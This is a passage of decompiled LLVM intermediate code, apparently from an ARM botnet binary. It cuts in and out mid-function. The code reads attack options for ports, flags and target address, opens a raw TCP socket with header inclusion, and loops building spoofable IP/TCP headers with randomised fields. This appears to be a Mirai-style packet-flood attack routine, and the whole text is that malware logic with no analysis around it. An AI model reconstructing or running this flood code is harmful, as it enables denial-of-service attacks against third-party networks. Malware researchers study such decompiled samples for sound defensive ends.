  %v1_bb5c = urem i32 %v5_bb54, 256
  store i32 %v1_bb5c, i32* %ip.global-to-local, align 4
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r4, align 4
  store i32 %v0_bb6c, i32* %r0.global-to-local, align 4
  %v6_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v7_bb74 = call i32 @attack_get_opt_int(i32 %v0_bb6c, i32* %v6_bb74, i32 5, i32 0)
  %v1_bb80 = urem i32 %v7_bb74, 256
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r5, align 4
  store i32 %v0_bb8c, i32* %r1.global-to-local, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb8c to i32*
  %v6_bb98 = call i32 @attack_get_opt_int(i32 %v0_bb90, i32* %v5_bb98, i32 6, i32 65535)
  %v0_bba0 = load i32, i32* @r5, align 4
  store i32 %v0_bba0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb98, i32* @r6, align 4
  %v0_bbb0 = load i32, i32* @r4, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  %v4_bbb4 = inttoptr i32 %v0_bba0 to i32*
  %v5_bbb4 = call i32 @attack_get_opt_int(i32 %v0_bbb0, i32* %v4_bbb4, i32 7, i32 65535)
  %v0_bbbc = load i32, i32* @r5, align 4
  store i32 %v0_bbbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bbb4, i32* @sl, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  store i32 %v0_bbcc, i32* %r0.global-to-local, align 4
  %v4_bbd0 = inttoptr i32 %v0_bbbc to i32*
  %v5_bbd0 = call i32 @attack_get_opt_int(i32 %v0_bbcc, i32* %v4_bbd0, i32 17, i32 65535)
  %v0_bbdc = load i32, i32* @r5, align 4
  store i32 %v0_bbdc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  store i32 %v0_bbe8, i32* %r0.global-to-local, align 4
  %v5_bbec = inttoptr i32 %v0_bbdc to i32*
  %v6_bbec = call i32 @attack_get_opt_int(i32 %v0_bbe8, i32* %v5_bbec, i32 18, i32 65535)
  %v0_bbf0 = load i32, i32* @r5, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r4, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 11, i32 0)
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc18 = load i32, i32* @r4, align 4
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v5_bc1c = inttoptr i32 %v0_bc08 to i32*
  %v6_bc1c = call i32 @attack_get_opt_int(i32 %v0_bc18, i32* %v5_bc1c, i32 12, i32 1)
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc20 to i32*
  %v6_bc34 = call i32 @attack_get_opt_int(i32 %v0_bc30, i32* %v5_bc34, i32 13, i32 0)
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v5_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v6_bc4c = call i32 @attack_get_opt_int(i32 %v0_bc48, i32* %v5_bc4c, i32 14, i32 0)
  %v0_bc50 = load i32, i32* @r5, align 4
  store i32 %v0_bc50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc50 to i32*
  %v6_bc64 = call i32 @attack_get_opt_int(i32 %v0_bc60, i32* %v5_bc64, i32 15, i32 0)
  %v0_bc68 = load i32, i32* @r5, align 4
  store i32 %v0_bc68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v5_bc7c = inttoptr i32 %v0_bc68 to i32*
  %v6_bc7c = call i32 @attack_get_opt_int(i32 %v0_bc78, i32* %v5_bc7c, i32 16, i32 0)
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc90 = load i32, i32* @r4, align 4
  store i32 %v0_bc90, i32* %r0.global-to-local, align 4
  %v5_bc94 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc94 = call i32 @attack_get_opt_int(i32 %v0_bc90, i32* %v5_bc94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  store i32 %v0_bca4, i32* %r1.global-to-local, align 4
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v4_bcac = inttoptr i32 %v0_bca4 to i32*
  %v5_bcac = call i32 @attack_get_opt_int(i32 %v0_bca8, i32* %v4_bcac, i32 1, i32 1)
  %v2_bcb8 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_bcb8, i32* %r3.global-to-local, align 4
  %v1_bcbc = urem i32 %v5_bcac, 256
  store i32 %v1_bcbc, i32* %ip.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r0.global-to-local, align 4
  %v5_bcd0 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd0 = call i32 @attack_get_opt_ip(i32 %v0_bcc8, i32* %v5_bcd0, i32 25, i32 %v2_bcb8, i32 %v1_bcbc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bce4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v7_bce8 = icmp eq i32 %v3_bce4, -1
  store i1 %v7_bce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bce8, label %dec_label_pc_c1b0, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcfc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcfc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bd10 = call i32 @__GI_setsockopt(i32 %v3_bce4, i32 0, i32 3, i32 %v6_bcfc, i32 4)
  store i32 %v5_bd10, i32* %r0.global-to-local, align 4
  %v7_bd14 = icmp eq i32 %v5_bd10, -1
  store i1 %v7_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd14, label %dec_label_pc_c1a8, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bcf4
  %v0_bd1c = load i32, i32* %sb.global-to-local, align 4
  %v3_bd1c = mul i32 %v0_bd1c, 65536
  store i32 %v3_bd1c, i32* @r5, align 4
  %v0_bd20 = load i32, i32* @r6, align 4
  %v0_bd24 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bd2c = urem i32 %v0_bd1c, 65536
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  %v3_bd30 = urem i32 %v0_bd20, 65536
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = urem i32 %v0_bd24, 65536
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v0_bd38 = load i32, i32* @r7, align 4
  %v2_bd38 = icmp eq i32 %v0_bd38, 0
  store i1 %v2_bd38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bd38, label %dec_label_pc_c1bc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd1c
  %v3_bd54 = mul i32 %v6_bc94, 65536
  %v1_bd58 = add i32 %v3_bd54, 2621440
  store i32 %v1_bd58, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bd20, 256
  %v3_bd7c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bd24, 256
  %v3_bd80 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bd20, 256
  %v4_bd84 = urem i32 %tmp61, 256
  %v5_bd84 = or i32 %v4_bd84, %v3_bd7c
  store i32 %v5_bd84, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bd24, 256
  %v4_bd88 = urem i32 %tmp62, 256
  %v5_bd88 = or i32 %v4_bd88, %v3_bd80
  store i32 %v5_bd88, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd58, 256
  %v3_bd9c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bd1c, 256
  %v3_bda0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bbd0, 256
  %v3_bda4 = and i32 %tmp65, 65280
  %v1_bda8 = urem i32 %v6_bc04, 2
  %v1_bdac = urem i32 %v6_bc1c, 2
  %tmp66 = udiv i32 %v5_bbd0, 256
  %v4_bdb0 = urem i32 %tmp66, 256
  %v5_bdb0 = or i32 %v4_bdb0, %v3_bda4
  %v4_bdb4 = udiv i32 %v1_bd58, 16777216
  %v5_bdb4 = or i32 %v3_bd9c, %v4_bdb4
  store i32 %v5_bdb4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bd1c, 256
  %v4_bdb8 = urem i32 %tmp67, 256
  %v5_bdb8 = or i32 %v4_bdb8, %v3_bda0
  store i32 %v5_bdb8, i32* @fp, align 4
  %v1_bdd4 = urem i32 %v6_bc34, 2
  store i32 %v1_bdd4, i32* %r2.global-to-local, align 4
  %v1_bdd8 = urem i32 %v6_bc4c, 2
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = urem i32 %v6_bc64, 2
  store i32 %v1_bddc, i32* %ip.global-to-local, align 4
  %v1_bde0 = urem i32 %v6_bc7c, 2
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  %v1_bde4 = urem i32 %v6_bc34, 256
  store i32 %v1_bde4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bb18, 16777216
  %v4_be58 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb54, 16777216
  %v4_be64 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bdac
  %v4_bed0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bdd4
  %v4_beec = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bdd8
  %v4_bf00 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bddc
  %v3_bf14 = and i32 %tmp74, 2
  %v2_bf38 = icmp eq i32 %v1_bde4, 0
  %v1_be60 = trunc i32 %v4_be58 to i8
  %extract.t = trunc i32 %v4_be64 to i8
  br label %dec_label_pc_be04

dec_label_pc_be04:                                ; preds = %bb70, %dec_label_pc_bd50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be10 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_be10, i32* %r0.global-to-local, align 4
  %v2_be18 = load i32, i32* @r4, align 4
  %v5_be18 = mul i32 %v2_be18, 4
  %v6_be18 = add i32 %v5_be18, %v2_bb00
  %v7_be18 = inttoptr i32 %v6_be18 to i32*
  store i32 %v2_be10, i32* %v7_be18, align 4
  %v3_be1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be1c, i32* %r2.global-to-local, align 4
  %v5_be24 = mul i32 %v3_be1c, 24
  %v1_be28 = load i32, i32* @r8, align 4
  %v2_be28 = add i32 %v1_be28, %v5_be24
  store i32 %v2_be28, i32* %r1.global-to-local, align 4
  store i32 %v2_bb00, i32* %r3.global-to-local, align 4
  %v4_be30 = mul i32 %v3_be1c, 4
  %v5_be30 = add i32 %v4_be30, %v2_bb00
  %v6_be30 = inttoptr i32 %v5_be30 to i32*
  %v7_be30 = load i32, i32* %v6_be30, align 4
  store i32 %v7_be30, i32* @r5, align 4
  %v1_be34 = inttoptr i32 %v7_be30 to i8*
  %v2_be34 = load i8, i8* %v1_be34, align 1
  %tmp75 = urem i8 %v2_be34, 16
  %v1_be38 = zext i8 %tmp75 to i32
  %v1_be3c = or i32 %v1_be38, 64
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v1_be40 = trunc i32 %v1_be3c to i8
  store i8 %v1_be40, i8* %v1_be34, align 1
  %v0_be44 = load i32, i32* @r5, align 4
  %v1_be44 = inttoptr i32 %v0_be44 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %v1_be48 = and i8 %v2_be44, -16
  %v1_be4c = or i8 %v1_be48, 5
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i8 %v1_be4c, i8* %v1_be44, align 1
  store i32 %v4_be58, i32* %r0.global-to-local, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v2_be5c = icmp eq i32 %v0_be5c, 0
  store i1 %v2_be5c, i1* %cpsr_z.global-to-local, align 1
  %v2_be60 = load i32, i32* @r5, align 4
  %v3_be60 = add i32 %v2_be60, 1
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  store i32 %v4_be64, i32* %r2.global-to-local, align 4
  %v0_be68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be04
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be6c = load i32, i32* @r5, align 4
  %v4_be6c = add i32 %v3_be6c, 6
  %v5_be6c = inttoptr i32 %v4_be6c to i16*
  store i16 64, i16* %v5_be6c, align 2
  %v0_be74.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be74.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be04, %bb
  %v0_be74.off0 = phi i8 [ %extract.t, %dec_label_pc_be04 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be74 = load i32, i32* @r5, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v0_be74.off0, i8* %v4_be74, align 1
  %v0_be78 = load i32, i32* %r3.global-to-local, align 4
  %v1_be78 = trunc i32 %v0_be78 to i8
  %v2_be78 = load i32, i32* @r5, align 4
  %v3_be78 = add i32 %v2_be78, 9
  %v4_be78 = inttoptr i32 %v3_be78 to i8*
  store i8 %v1_be78, i8* %v4_be78, align 1
  store i32 %v6_bcd0, i32* %ip.global-to-local, align 4
  %v1_be80 = load i32, i32* @r5, align 4
  %v2_be80 = add i32 %v1_be80, 12
  %v3_be80 = inttoptr i32 %v2_be80 to i32*
  store i32 %v6_bcd0, i32* %v3_be80, align 4
  %v0_be84 = load i32, i32* %r1.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, 16
  %v2_be84 = inttoptr i32 %v1_be84 to i32*
  %v3_be84 = load i32, i32* %v2_be84, align 4
  store i32 %v3_be84, i32* %r3.global-to-local, align 4
  %v0_be88 = load i32, i32* @sb, align 4
  %v1_be88 = trunc i32 %v0_be88 to i16
  %v2_be88 = load i32, i32* @r5, align 4
  %v3_be88 = add i32 %v2_be88, 2
  %v4_be88 = inttoptr i32 %v3_be88 to i16*
  store i16 %v1_be88, i16* %v4_be88, align 2
  %v0_be8c = load i32, i32* @fp, align 4
  %v1_be8c = trunc i32 %v0_be8c to i16
  %v2_be8c = load i32, i32* @r5, align 4
  %v3_be8c = add i32 %v2_be8c, 4
  %v4_be8c = inttoptr i32 %v3_be8c to i16*
  store i16 %v1_be8c, i16* %v4_be8c, align 2
  %v0_be90 = load i32, i32* %r3.global-to-local, align 4
  %v1_be90 = load i32, i32* @r5, align 4
  %v2_be90 = add i32 %v1_be90, 16
  %v3_be90 = inttoptr i32 %v2_be90 to i32*
  store i32 %v0_be90, i32* %v3_be90, align 4
  %v0_be94 = load i32, i32* @r6, align 4
  %v1_be94 = trunc i32 %v0_be94 to i16
  %v2_be94 = load i32, i32* @r5, align 4
  %v3_be94 = add i32 %v2_be94, 20
  %v4_be94 = inttoptr i32 %v3_be94 to i16*
  store i16 %v1_be94, i16* %v4_be94, align 2
  %v0_be98 = load i32, i32* @r5, align 4
  %v1_be98 = add i32 %v0_be98, 20
  store i32 %v1_be98, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be98, 32
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v4_be9c, i32* %r3.global-to-local, align 4
  %v1_bea0 = add i32 %v0_be98, 33
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bda8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be9c, 16
  %v1_bea8 = zext i8 %tmp76 to i32
  %v1_beac = or i32 %v1_bea8, 80
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = and i32 %v4_bea0, 223
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v1_beb4 = trunc i32 %v1_beac to i8
  store i8 %v1_beb4, i8* %v2_be9c, align 1
  %v0_beb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_beb8 = mul i32 %v1_beb8, 32
  %v5_beb8 = or i32 %v4_beb8, %v0_beb8
  store i32 %v5_beb8, i32* %r2.global-to-local, align 4
  store i32 %v5_bdb0, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v5_beb8 to i8
  %v2_bec0 = load i32, i32* @r4, align 4
  %v3_bec0 = add i32 %v2_bec0, 13
  %v4_bec0 = inttoptr i32 %v3_bec0 to i8*
  store i8 %v1_bec0, i8* %v4_bec0, align 1
  %v0_bec4 = load i32, i32* @r4, align 4
  %v1_bec4 = add i32 %v0_bec4, 13
  %v2_bec4 = inttoptr i32 %v1_bec4 to i8*
  %v3_bec4 = load i8, i8* %v2_bec4, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v1_bdac, i32* %r2.global-to-local, align 4
  %v1_becc = and i32 %v4_bec4, 239
  %v5_bed0 = or i32 %v1_becc, %v4_bed0
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bed4 = add i32 %v0_bec4, 4
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @sl, align 4
  %v1_bed8 = trunc i32 %v0_bed8 to i16
  %v2_bed8 = load i32, i32* @r4, align 4
  %v3_bed8 = add i32 %v2_bed8, 2
  %v4_bed8 = inttoptr i32 %v3_bed8 to i16*
  store i16 %v1_bed8, i16* %v4_bed8, align 2
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v2_bedc = load i32, i32* @r4, align 4
  %v3_bedc = add i32 %v2_bedc, 13
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 13
  %v2_bee0 = inttoptr i32 %v1_bee0 to i8*
  %v3_bee0 = load i8, i8* %v2_bee0, align 1
  %v4_bee0 = zext i8 %v3_bee0 to i32
  store i32 %v1_bdd4, i32* %r3.global-to-local, align 4
  %v1_bee8 = and i32 %v4_bee0, 247
  %v5_beec = or i32 %v1_bee8, %v4_beec
  store i32 %v5_beec, i32* %r2.global-to-local, align 4
  %v1_bef0 = trunc i32 %v5_beec to i8
  store i8 %v1_bef0, i8* %v2_bee0, align 1
  %v0_bef4 = load i32, i32* @r4, align 4
  %v1_bef4 = add i32 %v0_bef4, 13
  %v2_bef4 = inttoptr i32 %v1_bef4 to i8*
  %v3_bef4 = load i8, i8* %v2_bef4, align 1
  %v4_bef4 = zext i8 %v3_bef4 to i32
  store i32 %v1_bdd8, i32* %ip.global-to-local, align 4
  %v1_befc = and i32 %v4_bef4, 251
  %v5_bf00 = or i32 %v1_befc, %v4_bf00
  store i32 %v5_bf00, i32* %r3.global-to-local, align 4
  %v1_bf04 = trunc i32 %v5_bf00 to i8
  store i8 %v1_bf04, i8* %v2_bef4, align 1
  %v0_bf08 = load i32, i32* @r4, align 4
  %v1_bf08 = add i32 %v0_bf08, 13
  %v2_bf08 = inttoptr i32 %v1_bf08 to i8*
  %v3_bf08 = load i8, i8* %v2_bf08, align 1
  %v4_bf08 = zext i8 %v3_bf08 to i32
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  %v1_bf10 = and i32 %v4_bf08, 253
  %v4_bf14 = or i32 %v1_bf10, %v3_bf14
  store i32 %v4_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = trunc i32 %v4_bf14 to i8
  store i8 %v1_bf18, i8* %v2_bf08, align 1
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 13
  %v2_bf1c = inttoptr i32 %v1_bf1c to i8*
  %v3_bf1c = load i8, i8* %v2_bf1c, align 1
  %v4_bf1c = zext i8 %v3_bf1c to i32
  store i32 %v1_bde0, i32* %r1.global-to-local, align 4
  %v1_bf24 = and i32 %v4_bf1c, 254
  %v2_bf28 = or i32 %v1_bf24, %v1_bde0
  store i32 %v2_bf28, i32* %r3.global-to-local, align 4
  %v1_bf2c = trunc i32 %v2_bf28 to i8
  store i8 %v1_bf2c, i8* %v2_bf1c, align 1
  %v0_bf30 = call i32 @rand_next()
  %v1_bf30 = trunc i32 %v0_bf30 to i16
  store i32 %v0_bf30, i32* %r0.global-to-local, align 4
  store i32 %v1_bde4, i32* %r2.global-to-local, align 4
  store i1 %v2_bf38, i1* %cpsr_z.global-to-local, align 1
  %v3_bf44.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf38, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_bf3c = add i32 %v3_bf44.pre, 13
  %v3_bf3c = inttoptr i32 %v2_bf3c to i8*
  %v4_bf3c = load i8, i8* %v3_bf3c, align 1
  %v5_bf3c = zext i8 %v4_bf3c to i32
  %v2_bf40 = or i32 %v5_bf3c, 8
  store i32 %v2_bf40, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf44 = add i32 %v3_bf44.pre, 14
  %v5_bf44 = inttoptr i32 %v4_bf44 to i16*
  store i16 %v1_bf30, i16* %v5_bf44, align 2
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r5, align 4
  %v1_bf4c = add i32 %v0_bf4c, 40
  store i32 %v1_bf4c, i32* %r0.global-to-local, align 4
  br i1 %v2_bf38, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf50 = load i32, i32* @r3, align 4
  %v2_bf50 = trunc i32 %v1_bf50 to i8
  %v3_bf50 = load i32, i32* @r4, align 4
  %v4_bf50 = add i32 %v3_bf50, 13
  %v5_bf50 = inttoptr i32 %v4_bf50 to i8*
  store i8 %v2_bf50, i8* %v5_bf50, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf54 = inttoptr i32 %v1_bf4c to i16*
  %v3_bf54 = call i32 @rand_str(i16* %v2_bf54, i32 %v6_bc94)
  store i32 %v3_bf54, i32* %r0.global-to-local, align 4
  %v3_bf58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v1_bf5c = add i32 %v3_bf58, 1
  store i32 %v1_bf5c, i32* @r4, align 4
  %v1_bf60 = load i32, i32* @r7, align 4
  %v9_bf60 = icmp eq i32 %v1_bf5c, %v1_bf60
  store i1 %v9_bf60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf5c, i32* %stack_var_-44, align 4
  %v5_bf68 = icmp slt i32 %v1_bf5c, %v1_bf60
  br i1 %v5_bf68, label %dec_label_pc_be04, label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb70
  store i32 %v6_bc94, i32* %r3.global-to-local, align 4
  %v1_bf70 = add i32 %v6_bc94, 20
  store i32 %v1_bf70, i32* @sb, align 4
  br label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_bf6c
  %v0_bf908 = phi i32 [ %v1_bf60, %dec_label_pc_bf6c ], [ 0, %dec_label_pc_c1bc ]
  %stack_var_-140.0 = phi i32 [ %v3_bd54, %dec_label_pc_bf6c ], [ %v3_c1c8, %dec_label_pc_c1bc ]
  %storemerge = add i32 %v6_bc94, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf7c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf7c, 256
  %v3_bf84 = and i32 %tmp71, 65280
  store i32 %v3_bf84, i32* %r3.global-to-local, align 4
  %v4_bf88 = udiv i32 %v1_bf7c, 16777216
  %v5_bf88 = or i32 %v3_bf84, %v4_bf88
  store i32 %v5_bf88, i32* @sl, align 4
  %v3_c128 = icmp eq i32 %v3_bd2c, 65535
  %v2_c18c = icmp eq i32 %v1_bcbc, 0
  %v2_bfc8 = icmp eq i32 %v6_bcd0, -1
  %v7_bfc8 = icmp eq i32 %v6_bcd0, -1
  br label %dec_label_pc_bf8c

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4, %dec_label_pc_bf78
  %v0_bf90 = phi i32 [ %v0_bf908, %dec_label_pc_bf78 ], [ 0, %dec_label_pc_c0a4 ], [ 0, %dec_label_pc_bf8c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf90 = icmp eq i32 %v0_bf90, 0
  store i1 %v2_bf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf90, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_c020, %dec_label_pc_bf9c
  %v1_bfb4 = phi i32 [ %v1_c094, %dec_label_pc_c020 ], [ 0, %dec_label_pc_bf9c ]
  %v5_bfa4 = mul i32 %v1_bfb4, 24
  %v1_bfa8 = load i32, i32* @r8, align 4
  %v2_bfa8 = add i32 %v1_bfa8, %v5_bfa4
  store i32 %v2_bfa8, i32* %r3.global-to-local, align 4
  store i32 %v2_bb00, i32* %ip.global-to-local, align 4
  %v1_bfb0 = add i32 %v2_bfa8, 20
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i8*
  %v3_bfb0 = load i8, i8* %v2_bfb0, align 1
  %v4_bfb0 = zext i8 %v3_bfb0 to i32
  store i32 %v4_bfb0, i32* %r2.global-to-local, align 4
  %v4_bfb4 = mul i32 %v1_bfb4, 4
  %v5_bfb4 = add i32 %v4_bfb4, %v2_bb00
  %v6_bfb4 = inttoptr i32 %v5_bfb4 to i32*
  %v7_bfb4 = load i32, i32* %v6_bfb4, align 4
  store i32 %v7_bfb4, i32* @r5, align 4
